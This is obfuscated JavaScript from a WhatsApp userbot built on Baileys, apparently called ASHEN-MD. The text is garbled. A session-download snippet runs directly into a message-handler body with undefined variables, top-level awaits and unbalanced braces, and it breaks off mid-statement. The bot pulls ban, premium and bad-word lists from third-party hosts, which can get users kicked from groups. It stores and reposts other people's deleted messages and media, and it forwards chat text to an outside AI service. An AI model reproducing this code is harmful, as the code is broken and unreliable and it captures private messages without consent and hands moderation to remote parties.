const {
  default: makeWASocket,
  getAggregateVotesInPollMessage,
  useMultiFileAuthState,
  DisconnectReason,
  getDevice,
  fetchLatestBaileysVersion,
  jidNormalizedUser,
  getContentType,
  Browsers,
  makeInMemoryStore,
  makeCacheableSignalKeyStore,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  proto
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const P = require("pino");
const config = require("./config");
const NodeCache = require("node-cache");
const util = require("util");
const axios = require("axios");
const {
  File
} = require("megajs");
const path = require("path");
const msgRetryCounterCache = new NodeCache();
const l = console.log;
const SESSION_DIR = './' + config.SESSION_NAME;
if (!fs.existsSync(SESSION_DIR)) {
  fs.mkdirSync(SESSION_DIR);
}
const df = __dirname + ('/' + config.SESSION_NAME + "/creds.json");
if (!fs.existsSync(df)) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace("KAVIDU-MD=", '');
    if (sessdata.includes('#')) {
  (async () => {
    try {
      const filer = File.fromURL("https://mega.nz/file/" + sessdata);
      const buffer = await filer.downloadBuffer();
      fs.writeFileSync(df, buffer);
      console.log("✅ Session downloaded from Mega.nz and saved to creds.json!");
    } catch (err) {
      console.error("❌ Error downloading session from Mega.nz:", err.message);
    }
  })();
};
      const _0x1e815c = (await axios.get("https://raw.githubusercontent.com/Induwara-md/ASHEN-MD-FULL-DB-/refs/heads/main/main_var.json")).data;
      config.FOOTER = _0x1e815c.footer;
      const _0x2dd895 = await _0x7a6b25("https://mv-visper-full-db.pages.dev/Main/premium_user.json");
      const _0x2ac8ed = _0x2dd895.numbers.split(',');
      const _0x413721 = _0x2ac8ed.map(_0x3c720d => _0x3c720d.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x14d9fb);
      const _0x14d661 = await _0x7a6b25("https://mv-visper-full-db.pages.dev/Main/ban_number.json");
      const _0x5d84a4 = _0x14d661.split(',');
      const _0xfc4e4a = [..._0x5d84a4].map(_0x26abd0 => _0x26abd0.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x14d9fb);
      let _0xd016de = '' + config.JID_BLOCK;
      const _0x496b37 = _0xd016de.split(',');
      const _0x5d4baa = [..._0x496b37].includes(_0x222bfb);
      const _0x95662f = await _0x7a6b25("https://mv-visper-full-db.pages.dev/Main/ban_group.json");
      const _0x4a5c4f = _0x95662f.map(_0x4f3b46 => _0x4f3b46.replace(/[^0-9]/g, '') + '@g.us').includes(_0x222bfb);
      let _0x164fb9 = '' + config.SUDO;
      const _0x46d4e0 = _0x164fb9.split(',');
      const _0x3805d1 = [..._0x46d4e0].includes(_0x14d9fb);
      if (_0x12771f && _0x5d4baa && !_0x3c46fb && !_0x3805d1) {
        return;
      }
      const _0x8a4565 = (await axios.get("https://mv-visper-full-db.pages.dev/Main/react.json")).data;
      const _0x5f1ee4 = (await axios.get("https://raw.githubusercontent.com/Induwara-md/ASHEN-MD-FULL-DB-/refs/heads/main/main_var.json")).data;
      const _0x45d117 = _0x4b9a40.key.server_id;
      const _0xf9ac7e = ['❤️', '😮', '👍', '🙏'];
      const _0x396154 = _0xf9ac7e[Math.floor(Math.random() * _0xf9ac7e.length)];
      await _0x55533e.newsletterReactMessage('' + _0x5f1ee4.mainchanal, _0x45d117, _0x396154);
      if (_0x8ddc90.includes("94756194771")) {
        if (_0x5cd917) {
          return;
        }
        _0x43833d.react('' + _0x8a4565.sadas);
      }
      if (_0x8ddc90.includes("94756194771")) {
        if (_0x5cd917) {
          return;
        }
        _0x43833d.react('' + _0x8a4565.saviya);
      }
      const _0x28a435 = config.OWNER_NUMBER;
      if (_0x8ddc90.includes(_0x28a435)) {
        if (_0x5cd917) {
          return;
        }
        _0x43833d.react("☠️");
      }
      if (_0x12771f && config.CMD_ONLY_READ == "true") {
        await _0x55533e.readMessages([_0x4b9a40.key]);
      }
      if (_0x12771f && _0x4a5c4f) {
        return;
      }
      if (config.WORK_TYPE == "only_group") {
        if (!_0xeed4d1 && _0x12771f && !_0x3c46fb && !_0xf8a499 && !_0x3805d1) {
          return;
        }
      }
      if (config.WORK_TYPE == "private") {
        if (_0x12771f && !_0x3c46fb && !_0xf8a499 && !_0x3805d1) {
          return;
        }
      }
      if (config.WORK_TYPE == 'inbox') {
        if (_0xeed4d1 && !_0x3c46fb && !_0xf8a499 && !_0x3805d1) {
          return;
        }
      }
      if (_0xfc4e4a) {
        await _0x55533e.sendMessage(_0x222bfb, {
          'delete': _0x4b9a40.key
        });
        await _0x55533e.groupParticipantsUpdate(_0x222bfb, [_0x14d9fb], "remove");
        return await _0x55533e.sendMessage(_0x222bfb, {
          'text': "*You are banned by ASHEN-MD ❌*"
        });
      }
      if (config.AUTO_BLOCK == "true" && _0x4b9a40.chat.endsWith("@s.whatsapp.net")) {
        if (!_0x3c46fb) {
          await _0x55533e.sendMessage(_0x222bfb, {
            'text': "*Warning 1 ❗*"
          });
          await _0x55533e.sendMessage(_0x222bfb, {
            'text': "*Warning 2 ❗*"
          });
          await _0x55533e.sendMessage(_0x222bfb, {
            'text': "*Warning 3 ❗*"
          });
          await _0x55533e.sendMessage(_0x222bfb, {
            'text': "*Blocked 🚫*"
          });
          await _0x55533e.updateBlockStatus(_0x4b9a40.sender, "block");
        }
      }
      _0x55533e.ev.on('call', async _0x48c752 => {
        if (config.ANTI_CALL == "true") {
          for (const _0x23feaf of _0x48c752) {
            if (_0x23feaf.status === "offer") {
              await _0x55533e.rejectCall(_0x23feaf.id, _0x23feaf.from);
              if (!_0x23feaf.isGroup) {
                await _0x55533e.sendMessage(_0x23feaf.from, {
                  'text': "*Call rejected automatically because owner is busy ⚠️*",
                  'mentions': [_0x23feaf.from]
                });
                break;
              }
            }
          }
        }
      });
      if (_0x12771f && config.CMD_ONLY_READ == "true") {
        await _0x55533e.readMessages([_0x4b9a40.key]);
      }
      const _0x49ae8a = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋'];
      const _0x520320 = _0x49ae8a[Math.floor(Math.random() * _0x49ae8a.length)];
      if (!_0x3c46fb && !_0x5d4baa && config.AUTO_REACT == "true") {
        if (_0x5cd917) {
          return;
        }
        await _0x55533e.sendMessage(_0x4b9a40.chat, {
          'react': {
            'text': _0x520320,
            'key': _0x4b9a40.key
          }
        });
      }
      if (config.AUTO_MSG_READ == "true") {
        await _0x55533e.readMessages([_0x4b9a40.key]);
      }
      if (config.AUTO_TYPING == "true") {
        _0x55533e.sendPresenceUpdate("composing", _0x4b9a40.key.remoteJid);
      }
      if (config.AUTO_RECORDING == "true") {
        _0x55533e.sendPresenceUpdate("recording", _0x4b9a40.key.remoteJid);
      }
      if (config.CHAT_BOT == "true") {
        if (_0x43833d.quoted) {
          let _0x2acea0 = _0x43833d.body ? _0x43833d.body.toLowerCase() : '';
          try {
            let _0x43e233 = await _0x7a6b25("https://saviya-kolla-api.koyeb.app/ai/saviya-ai?query=" + _0x2acea0);
            await _0x55533e.sendMessage(_0x222bfb, {
              'text': _0x43e233.result.data
            });
          } catch (_0x1c8c1a) {
            console.error("AI Chat Error:", _0x1c8c1a);
            await _0x55533e.sendMessage(_0x222bfb, {
              'text': '.'
            });
          }
        }
      }
      if (!_0xf8a499) {
        if (config.ANTI_DELETE == "true") {
          if (!_0x43833d.id.startsWith("BAE5")) {
            if (!fs.existsSync("message_data")) {
              fs.mkdirSync("message_data");
            }
            function _0x2b22b9(_0x2c77de, _0x180b25) {
              const _0x41fde8 = path.join("message_data", _0x2c77de, _0x180b25 + '.json');
              try {
                const _0x35271d = fs.readFileSync(_0x41fde8, "utf8");
                return JSON.parse(_0x35271d) || [];
              } catch (_0x370f42) {
                return [];
              }
            }
            function _0x469121(_0x4db277, _0x108492, _0x29c21b) {
              const _0x475b13 = path.join("message_data", _0x4db277);
              if (!fs.existsSync(_0x475b13)) {
                fs.mkdirSync(_0x475b13, {
                  'recursive': true
                });
              }
              const _0x295a3c = path.join(_0x475b13, _0x108492 + ".json");
              try {
                fs.writeFileSync(_0x295a3c, JSON.stringify(_0x29c21b, null, 0x2));
              } catch (_0x2f776a) {
                console.error("Error saving chat data:", _0x2f776a);
              }
            }
            function _0x4d4112(_0x1a82a4) {
              const _0x4e0569 = _0x1a82a4.key.id;
              const _0x21986c = _0x2b22b9(_0x222bfb, _0x4e0569);
              _0x21986c.push(_0x1a82a4);
              _0x469121(_0x222bfb, _0x4e0569, _0x21986c);
            }
            function _0x4d1697(_0x41934b) {
              const _0x4d532b = _0x41934b.msg.key.id;
              const _0x3089c2 = _0x2b22b9(_0x222bfb, _0x4d532b);
              const _0x746d71 = _0x3089c2[0x0];
              if (_0x746d71) {
                const _0x51481d = _0x41934b.sender.split('@')[0x0];
                const _0x5bd17e = _0x746d71.key.participant ?? _0x41934b.sender;
                const _0x31fe65 = _0x5bd17e.split('@')[0x0];
                if (_0x51481d.includes(_0x117f3b) || _0x31fe65.includes(_0x117f3b)) {
                  return;
                }
                if (_0x746d71.message && _0x746d71.message.conversation && _0x746d71.message.conversation !== '') {
                  const _0x12f361 = _0x746d71.message.conversation;
                  var _0x3d71c8 = '```';
                  _0x55533e.sendMessage(_0x222bfb, {
                    'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + _0x3d71c8 + _0x12f361 + _0x3d71c8
                  });
                } else {
                  if (_0x746d71.msg.type === 'MESSAGE_EDIT') {
                    _0x55533e.sendMessage(_0x222bfb, {
                      'text': "❌ *edited message detected* " + _0x746d71.message.editedMessage.message.protocolMessage.editedMessage.conversation
                    }, {
                      'quoted': _0x4b9a40
                    });
                  } else {
                    if (_0x746d71.message && _0x746d71.message.exetendedTextMessage && _0x746d71.msg.text) {
                      const _0x3a7fce = _0x746d71.msg.text;
                      if (_0xeed4d1 && _0x3a7fce.includes("chat.whatsapp.com")) {
                        return;
                      }
                      var _0x3d71c8 = "```";
                      _0x55533e.sendMessage(_0x222bfb, {
                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + _0x3d71c8 + _0x3a7fce + _0x3d71c8
                      });
                    } else {
                      if (_0x746d71.message && _0x746d71.message.exetendedTextMessage) {
                        if (_0xeed4d1 && messageText.includes('chat.whatsapp.com')) {
                          return;
                        }
                        var _0x3d71c8 = "```";
                        _0x55533e.sendMessage(_0x222bfb, {
                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + _0x3d71c8 + _0x746d71.body + _0x3d71c8
                        });
                      } else {
                        if (_0x746d71.type === "extendedTextMessage") {
                          async function _0x2f075b() {
                            if (_0x746d71.message.extendedTextMessage) {
                              if (_0xeed4d1 && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x55533e.sendMessage(_0x222bfb, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + '```' + _0x746d71.message.extendedTextMessage.text + '```'
                              });
                            } else {
                              if (_0xeed4d1 && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x55533e.sendMessage(_0x222bfb, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + '```' + _0x746d71.message.extendedTextMessage.text + '```'
                              });
                            }
                          }
                          _0x2f075b();
                        } else {
                          if (_0x746d71.type === "imageMessage") {
                            async function _0xda8658() {
                              var _0x44213c = _0x4d32a6('');
                              const _0x448076 = _0x1b6df1(_0x55533e, _0x746d71);
                              let _0x253cab = await _0x448076.download(_0x44213c);
                              let _0x23ab03 = require('file-type');
                              let _0x13a214 = _0x23ab03.fromBuffer(_0x253cab);
                              await fs.promises.writeFile('./' + _0x13a214.ext, _0x253cab);
                              if (_0x746d71.message.imageMessage.caption) {
                                const _0x253074 = _0x746d71.message.imageMessage.caption;
                                if (_0xeed4d1 && _0x253074.includes("chat.whatsapp.com")) {
                                  return;
                                }
                                await _0x55533e.sendMessage(_0x222bfb, {
                                  'image': fs.readFileSync('./' + _0x13a214.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + _0x746d71.message.imageMessage.caption
                                });
                              } else {
                                await _0x55533e.sendMessage(_0x222bfb, {
                                  'image': fs.readFileSync('./' + _0x13a214.ext),
                                  'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + '_'
                                });
                              }
                            }
                            _0xda8658();
                          } else {
                            if (_0x746d71.type === "videoMessage") {
                              async function _0x432168() {
                                var _0x1d0d7b = _0x4d32a6('');
                                const _0x1e72c1 = _0x1b6df1(_0x55533e, _0x746d71);
                                const _0x3e0f74 = _0x746d71.message.videoMessage.fileLength;
                                const _0xf0d7b2 = _0x746d71.message.videoMessage.seconds;
                                const _0x399556 = config.MAX_SIZE;
                                const _0x207d2e = _0x3e0f74 / 1048576;
                                if (_0x746d71.message.videoMessage.caption) {
                                  if (_0x207d2e < _0x399556 && _0xf0d7b2 < 1800) {
                                    let _0x152cd7 = await _0x1e72c1.download(_0x1d0d7b);
                                    let _0x4fdbac = require("file-type");
                                    let _0x4e168a = _0x4fdbac.fromBuffer(_0x152cd7);
                                    await fs.promises.writeFile('./' + _0x4e168a.ext, _0x152cd7);
                                    const _0x51475e = _0x746d71.message.videoMessage.caption;
                                    if (_0xeed4d1 && _0x51475e.includes('chat.whatsapp.com')) {
                                      return;
                                    }
                                    await _0x55533e.sendMessage(_0x222bfb, {
                                      'video': fs.readFileSync('./' + _0x4e168a.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n\n> 🔓 Message Text: " + _0x746d71.message.videoMessage.caption
                                    });
                                  }
                                } else {
                                  let _0xd8cc68 = await _0x1e72c1.download(_0x1d0d7b);
                                  let _0x36819f = require("file-type");
                                  let _0x25d64d = _0x36819f.fromBuffer(_0xd8cc68);
                                  await fs.promises.writeFile('./' + _0x25d64d.ext, _0xd8cc68);
                                  const _0x5e6730 = _0x746d71.message.videoMessage.fileLength;
                                  const _0x59d428 = _0x746d71.message.videoMessage.seconds;
                                  const _0x388db5 = config.MAX_SIZE;
                                  const _0xba6a95 = _0x5e6730 / 1048576;
                                  if (_0xba6a95 < _0x388db5 && _0x59d428 < 1800) {
                                    await _0x55533e.sendMessage(_0x222bfb, {
                                      'video': fs.readFileSync('./' + _0x25d64d.ext),
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + '_'
                                    });
                                  }
                                }
                              }
                              _0x432168();
                            } else {
                              if (_0x746d71.type === "documentMessage") {
                                async function _0x5f46bf() {
                                  var _0x17ac40 = _0x4d32a6('');
                                  const _0x459fdf = _0x1b6df1(_0x55533e, _0x746d71);
                                  let _0x37af92 = await _0x459fdf.download(_0x17ac40);
                                  let _0x41c414 = require("file-type");
                                  let _0xc1ad22 = _0x41c414.fromBuffer(_0x37af92);
                                  await fs.promises.writeFile('./' + _0xc1ad22.ext, _0x37af92);
                                  if (_0x746d71.message.documentWithCaptionMessage) {
                                    await _0x55533e.sendMessage(_0x222bfb, {
                                      'document': fs.readFileSync('./' + _0xc1ad22.ext),
                                      'mimetype': _0x746d71.message.documentMessage.mimetype,
                                      'fileName': _0x746d71.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                    });
                                  } else {
                                    await _0x55533e.sendMessage(_0x222bfb, {
                                      'document': fs.readFileSync('./' + _0xc1ad22.ext),
                                      'mimetype': _0x746d71.message.documentMessage.mimetype,
                                      'fileName': _0x746d71.message.documentMessage.fileName,
                                      'caption': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                    });
                                  }
                                }
                                _0x5f46bf();
                              } else {
                                if (_0x746d71.type === "audioMessage") {
                                  async function _0x2aad0f() {
                                    var _0x484396 = _0x4d32a6('');
                                    const _0x2d7ee1 = _0x1b6df1(_0x55533e, _0x746d71);
                                    let _0x5e20c0 = await _0x2d7ee1.download(_0x484396);
                                    let _0x2f1bac = require("file-type");
                                    let _0x1dd078 = _0x2f1bac.fromBuffer(_0x5e20c0);
                                    await fs.promises.writeFile('./' + _0x1dd078.ext, _0x5e20c0);
                                    if (_0x746d71.message.audioMessage) {
                                      const _0x456914 = await _0x55533e.sendMessage(_0x222bfb, {
                                        'audio': fs.readFileSync('./' + _0x1dd078.ext),
                                        'mimetype': _0x746d71.message.audioMessage.mimetype,
                                        'fileName': _0x43833d.id + '.mp3'
                                      });
                                      return await _0x55533e.sendMessage(_0x222bfb, {
                                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                      }, {
                                        'quoted': _0x456914
                                      });
                                    } else {
                                      if (_0x746d71.message.audioMessage.ptt === "true") {
                                        const _0x5809d2 = await _0x55533e.sendMessage(_0x222bfb, {
                                          'audio': fs.readFileSync('./' + _0x1dd078.ext),
                                          'mimetype': _0x746d71.message.audioMessage.mimetype,
                                          'ptt': 'true',
                                          'fileName': _0x43833d.id + '.mp3'
                                        });
                                        return await _0x55533e.sendMessage(_0x222bfb, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                        }, {
                                          'quoted': _0x5809d2
                                        });
                                      }
                                    }
                                  }
                                  _0x2aad0f();
                                } else {
                                  if (_0x746d71.type === 'stickerMessage') {
                                    async function _0x1d3661() {
                                      var _0x39e244 = _0x4d32a6('');
                                      const _0x2343b7 = _0x1b6df1(_0x55533e, _0x746d71);
                                      let _0x19dc8e = await _0x2343b7.download(_0x39e244);
                                      let _0x2eb1be = require('file-type');
                                      let _0x34ded2 = _0x2eb1be.fromBuffer(_0x19dc8e);
                                      await fs.promises.writeFile('./' + _0x34ded2.ext, _0x19dc8e);
                                      if (_0x746d71.message.stickerMessage) {
                                        const _0x19a98b = await _0x55533e.sendMessage(_0x222bfb, {
                                          'sticker': fs.readFileSync('./' + _0x34ded2.ext),
                                          'package': "PRABATH-MD 🌟"
                                        });
                                        return await _0x55533e.sendMessage(_0x222bfb, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                        }, {
                                          'quoted': _0x19a98b
                                        });
                                      } else {
                                        const _0x539cfc = await _0x55533e.sendMessage(_0x222bfb, {
                                          'sticker': fs.readFileSync('./' + _0x34ded2.ext),
                                          'package': "PRABATH-MD 🌟"
                                        });
                                        return await _0x55533e.sendMessage(_0x222bfb, {
                                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x51481d + "_\n  📩 *Sent by:* _" + _0x31fe65 + "_\n"
                                        }, {
                                          'quoted': _0x539cfc
                                        });
                                      }
                                    }
                                    _0x1d3661();
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              } else {
                console.log("Original message not found for revocation.");
              }
            }
            if (_0x4b9a40.msg && _0x4b9a40.msg.type === 0x0) {
              _0x4d1697(_0x4b9a40);
            } else {
              _0x4d4112(_0x4b9a40);
            }
          }
        }
      }
      const _0x3e95e4 = await _0x7a6b25('https://mv-visper-full-db.pages.dev/Main/bad_word.json');
      if (config.ANTI_BAD == "true") {
        if (!_0x3c46fb && !_0x2e3ea5.includes(_0x14d9fb)) {
          for (let _0x1ffe81 of _0x3e95e4) {
            let _0x258ac9 = _0x267454.toLowerCase();
            if (_0x258ac9.includes(_0x1ffe81) && !_0x258ac9.includes("tent") && !_0x258ac9.includes("docu") && !_0x258ac9.includes("https")) {
              if (config.ACTION == "delete" || config.ACTION == 'both') {
                await _0x55533e.sendMessage(_0x222bfb, {
                  'delete': _0x4b9a40.key
                });
              }
              await _0x55533e.sendMessage(_0x222bfb, {
                'text': "🚫 @" + _0x43833d.sender.split('@')[0x0] + " *Bad word detected..!*",
                'mentions': [_0x14d9fb]
              });
              if (config.ACTION == "remove" || config.ACTION == "both") {
                await _0x55533e.groupParticipantsUpdate(_0x222bfb, [_0x14d9fb], "remove");
              }
              break;
            }
          }
        }
      }
      if (_0x267454 === "send" || _0x267454 === 'Send' || _0x267454 === "Ewpm" || _0x267454 === "ewpn" || _0x267454 === "Dapan" || _0x267454 === "dapan" || _0x267454 === "oni" || _0x267454 === "Oni" || _0x267454 === "save" || _0x267454 === 'Save' || _0x267454 === "ewanna" || _0x267454 === "Ewanna" || _0x267454 === "ewam" || _0x267454 === 'Ewam' || _0x267454 === 'sv' || _0x267454 === 'Sv' || _0x267454 === 'දාන්න' || _0x267454 === 'එවම්න') {
        const _0x54f05a = JSON.stringify(_0x4b9a40.message, null, 0x2);
        const _0xeb8bcc = JSON.parse(_0x54f05a);
        const _0x59faae = _0xeb8bcc.extendedTextMessage.contextInfo.remoteJid;
        if (!_0x59faae) {
          return;
        }
        const _0x4a7be3 = _0x2bfc06 => {
          const _0x5e75a4 = {
            'jpg': "ffd8ffe0",
            'png': "89504e47",
            'mp4': "00000018"
          };
          const _0xae8a06 = _0x2bfc06.toString("hex", 0x0, 0x4);
          return Object.keys(_0x5e75a4).find(_0x22e4df => _0x5e75a4[_0x22e4df] === _0xae8a06);
        };
        if (_0x43833d.quoted.type === "imageMessage") {
          var _0xd21a4b = _0x4d32a6('');
          let _0x202923 = await _0x43833d.quoted.download(_0xd21a4b);
          let _0x486fec = _0x4a7be3(_0x202923);
          await fs.promises.writeFile('./' + _0x486fec, _0x202923);
          const _0x51e1ee = _0x43833d.quoted.imageMessage.caption;
          await _0x55533e.sendMessage(_0x222bfb, {
            'image': fs.readFileSync('./' + _0x486fec),
            'caption': _0x51e1ee
          });
        } else {
          if (_0x43833d.quoted.type === "videoMessage") {
            var _0xd21a4b = _0x4d32a6('');
            let _0x8fa98d = await _0x43833d.quoted.download(_0xd21a4b);
            let _0x509b27 = _0x4a7be3(_0x8fa98d);
            await fs.promises.writeFile('./' + _0x509b27, _0x8fa98d);
            const _0x3ddc72 = _0x43833d.quoted.videoMessage.caption;
            let _0x545a7 = {
              'video': fs.readFileSync('./' + _0x509b27),
              'mimetype': "video/mp4",
              'fileName': _0x43833d.id + ".mp4",
              'caption': _0x3ddc72,
              'headerType': 0x4
            };
            await _0x55533e.sendMessage(_0x222bfb, _0x545a7, {
              'quoted': _0x4b9a40
            });
          }
        }
      }
      if (_0x267454 === 'hi' || _0x267454 === 'Hi' || _0x267454 === "hey" || _0x267454 === "Hey" || _0x267454 === 'hii' || _0x267454 === "Hii") {
        if (config.AUTO_VOICE == 'true') {
          if (_0x3c46fb) {
            return;
          }
          await _0x55533e.sendPresenceUpdate("recording", _0x222bfb);
          await _0x55533e.sendMessage(_0x222bfb, {
            'audio': {
              'url': 'https://mv-visper-full-db.pages.dev/Data/WhatsApp%20Audio%202025-04-28%20at%2017.12.23.mpeg'
            },
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x4b9a40
          });
        }
      }
      const _0x529c9a = require("./command");
      const _0x1aa8c5 = _0x12771f ? _0x267454.slice(0x1).trim().split(" ")[0x0].toLowerCase() : false;
      if (_0x12771f) {
        const _0x587290 = _0x529c9a.commands.find(_0x4c1ac7 => _0x4c1ac7.pattern === _0x1aa8c5) || _0x529c9a.commands.find(_0x5e1df3 => _0x5e1df3.alias && _0x5e1df3.alias.includes(_0x1aa8c5));
        if (_0x587290) {
          if (_0x587290.react) {
            _0x55533e.sendMessage(_0x222bfb, {
              'react': {
                'text': _0x587290.react,
                'key': _0x4b9a40.key
              }
            });
          }
          try {
            _0x587290["function"](_0x55533e, _0x4b9a40, _0x43833d, {
              'from': _0x222bfb,
              'prefix': _0x190cff,
              'l': l,
              'isSudo': _0x3805d1,
              'quoted': _0x545eb6,
              'body': _0x267454,
              'isCmd': _0x12771f,
              'isPre': _0x413721,
              'command': _0x2f0005,
              'args': _0x1b1aad,
              'q': _0x2e9303,
              'isGroup': _0xeed4d1,
              'sender': _0x14d9fb,
              'senderNumber': _0x8ddc90,
              'botNumber2': _0x4fcee5,
              'botNumber': _0x117f3b,
              'pushname': _0x35278d,
              'isMe': _0x3c46fb,
              'isOwner': _0xf8a499,
              'groupMetadata': _0x486172,
              'groupName': _0x5f09e3,
              'participants': _0x169562,
              'groupAdmins': _0x2e3ea5,
              'isBotAdmins': _0x89a709,
              'isAdmins': _0x4e29b8,
              'reply': _0xf13504
            });
          } catch (_0x37bbd2) {
            console.error("[PLUGIN ERROR] ", _0x37bbd2);
          }
        }
      }
      _0x529c9a.commands.map(async _0x219277 => {
        if (_0x267454 && _0x219277.on === "body") {
          _0x219277["function"](_0x55533e, _0x4b9a40, _0x43833d, {
            'from': _0x222bfb,
            'prefix': _0x190cff,
            'l': l,
            'isSudo': _0x3805d1,
            'quoted': _0x545eb6,
            'isPre': _0x413721,
            'body': _0x267454,
            'isCmd': _0x12771f,
            'command': _0x219277,
            'args': _0x1b1aad,
            'q': _0x2e9303,
            'isGroup': _0xeed4d1,
            'sender': _0x14d9fb,
            'senderNumber': _0x8ddc90,
            'botNumber2': _0x4fcee5,
            'botNumber': _0x117f3b,
            'pushname': _0x35278d,
            'isMe': _0x3c46fb,
            'isOwner': _0xf8a499,
            'groupMetadata': _0x486172,
            'groupName': _0x5f09e3,
            'participants': _0x169562,
            'groupAdmins': _0x2e3ea5,
            'isBotAdmins': _0x89a709,
            'isAdmins': _0x4e29b8,
            'reply': _0xf13504
          });
        } else {
          if (_0x4b9a40.q && _0x219277.on === "text") {
            _0x219277["function"](_0x55533e, _0x4b9a40, _0x43833d, {
              'from': _0x222bfb,
              'l': l,
              'quoted': _0x545eb6,
              'body': _0x267454,
              'isSudo': _0x3805d1,
              'isCmd': _0x12771f,
              'isPre': _0x413721,
              'command': _0x219277,
              'args': _0x1b1aad,
              'q': _0x2e9303,
              'isGroup': _0xeed4d1,
              'sender': _0x14d9fb,
              'senderNumber': _0x8ddc90,
              'botNumber2': _0x4fcee5,
              'botNumber': _0x117f3b,
              'pushname': _0x35278d,
              'isMe': _0x3c46fb,
              'isOwner': _0xf8a499,
              'groupMetadata': _0x486172,
              'groupName': _0x5f09e3,
              'participants': _0x169562,
              'groupAdmins': _0x2e3ea5,
              'isBotAdmins': _0x89a709,
              'isAdmins': _0x4e29b8,
              'reply': _0xf13504
            });
          } else {
            if ((_0x219277.on === "image" || _0x219277.on === "photo") && _0x4b9a40.type === "imageMessage") {
              _0x219277['function'](_0x55533e, _0x4b9a40, _0x43833d, {
                'from': _0x222bfb,
                'prefix': _0x190cff,
                'l': l,
                'quoted': _0x545eb6,
                'isSudo': _0x3805d1,
                'body': _0x267454,
                'isCmd': _0x12771f,
                'command': _0x219277,
                'isPre': _0x413721,
                'args': _0x1b1aad,
                'q': _0x2e9303,
                'isGroup': _0xeed4d1,
                'sender': _0x14d9fb,
                'senderNumber': _0x8ddc90,
                'botNumber2': _0x4fcee5,
                'botNumber': _0x117f3b,
                'pushname': _0x35278d,
                'isMe': _0x3c46fb,
                'isOwner': _0xf8a499,
                'groupMetadata': _0x486172,
                'groupName': _0x5f09e3,
                'participants': _0x169562,
                'groupAdmins': _0x2e3ea5,
                'isBotAdmins': _0x89a709,
                'isAdmins': _0x4e29b8,
                'reply': _0xf13504
              });
            } else if (_0x219277.on === "sticker" && _0x4b9a40.type === 'stickerMessage') {
              _0x219277["function"](_0x55533e, _0x4b9a40, _0x43833d, {
                'from': _0x222bfb,
                'prefix': _0x190cff,
                'l': l,
                'quoted': _0x545eb6,
                'isSudo': _0x3805d1,
                'body': _0x267454,
                'isCmd': _0x12771f,
                'command': _0x219277,
                'args': _0x1b1aad,
                'isPre': _0x413721,
                'q': _0x2e9303,
                'isGroup': _0xeed4d1,
                'sender': _0x14d9fb,
                'senderNumber': _0x8ddc90,
                'botNumber2': _0x4fcee5,
                'botNumber': _0x117f3b,
                'pushname': _0x35278d,
                'isMe': _0x3c46fb,
                'isOwner': _0xf8a499,
                'groupMetadata': _0x486172,
                'groupName': _0x5f09e3,
                'participants': _0x169562,
                'groupAdmins': _0x2e3ea5,
                'isBotAdmins': _0x89a709,
                'isAdmins': _0x4e29b8,
                'reply': _0xf13504
              });
            }
          }
        }
      });
      if (config.ANTI_LINK == "true") {
        if (!_0x3c46fb && !_0x2e3ea5.includes(_0x14d9fb) && _0x89a709) {
          const _0x3d2b90 = _0x267454.toLowerCase();
          const _0x1366bb = (config.VALUSE || []).map(_0x2935c1 => _0x2935c1.trim().toLowerCase());
